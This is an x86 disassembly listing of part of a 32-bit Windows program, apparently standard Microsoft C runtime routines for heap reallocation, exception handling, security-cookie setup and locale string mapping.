  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
